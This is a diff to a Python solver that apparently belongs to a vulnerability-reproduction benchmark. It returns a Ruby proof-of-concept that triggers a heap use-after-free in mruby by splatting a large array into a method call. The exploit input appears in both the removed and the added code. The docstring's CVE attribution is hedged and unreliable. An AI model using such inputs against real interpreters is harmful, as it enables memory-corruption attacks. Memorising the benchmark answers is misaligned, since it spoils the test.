@@ -3,28 +3,21 @@ import os
 class Solution:
     def solve(self, src_path: str) -> bytes:
         """
-        Generate a PoC that triggers the Heap Use After Free vulnerability.
-        The vulnerability occurs when mrb_stack_extend moves the stack but a pointer
-        (regs) is not updated, typically triggered by splat expansion of a large array
-        which forces stack reallocation.
+        Generate a PoC that triggers the vulnerability.
+        
+        The vulnerability corresponds to CVE-2018-10199 (or similar issues in mruby) where
+        OP_APOST causes a stack extension but fails to update the cached register pointer (regs),
+        leading to a Use-After-Free.
+        
+        To trigger this:
+        1. Define a method with pre-arguments, a splat argument (rest), and post-arguments.
+           This forces the VM to use the OP_APOST instruction.
+        2. Call this method with a large number of arguments to force the VM stack to grow 
+           (mrb_stack_extend) during the function call setup or execution.
         """
-        # The PoC structure defines a method accepting variable arguments
-        # and calls it with a large splatted array to force stack extension.
-        prefix = "def f(*a);end;f(*["
-        suffix = "])"
-        
-        # Target the ground-truth length to ensure the realloc moves the stack
-        # (forcing the UAF on the stale pointer).
-        target_len = 7270
-        overhead = len(prefix) + len(suffix)
-        remaining = target_len - overhead
-        
-        # Construct the array content: "0," repeated N times, then "0"
-        # Each entry "0," is 2 bytes. The final "0" is 1 byte.
-        # Length = 2 * n + 1
-        n = (remaining - 1) // 2
-        
-        payload = "0," * n + "0"
-        
-        poc = prefix + payload + suffix
-        return poc.encode('utf-8')
+        # A compact Ruby script that triggers the issue.
+        # We create an array of 100,000 elements and splat it into the function call.
+        # This places 100,000+ items on the stack, forcing reallocation.
+        # When OP_APOST runs, it may access the old stack memory if regs wasn't updated.
+        poc = b"def f(a,*b,c);end;f(0,*Array.new(100000,0),0)"
+        return poc
